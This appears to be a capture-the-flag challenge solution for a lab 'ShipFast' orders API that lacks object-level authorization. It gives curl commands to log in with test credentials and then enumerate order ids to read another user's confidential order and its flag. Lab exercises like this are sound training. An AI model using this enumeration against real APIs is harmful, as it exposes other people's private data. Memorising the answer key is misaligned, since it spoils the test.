# api/bola — Bola (resource-resident, low)

**ShipFast** orders API. `GET /api/v1/orders/{id}` requires authentication but performs **no object-level authorization** — it never checks that the order belongs to the caller.

## Intended path
1. `curl -s -X POST -H 'Content-Type: application/json' -d '{"username":"0xnhsec","password":"vlh-tester-01"}' http://victim.target.lab:8119/api/v1/auth/login` → `token`.
2. List your own orders: `curl -s -H "Authorization: Bearer <token>" http://victim.target.lab:8119/api/v1/orders` (ids are small integers).
3. Enumerate other users' orders: `curl -s -H "Authorization: Bearer <token>" http://victim.target.lab:8119/api/v1/orders/3` — the innocent's confidential order carries the flag in `secret_note`.

**Flag:** `DSLTV{API-Bola-<9 digits>}` (inside the innocent's order record — server-side data, only reachable via the broken lookup).
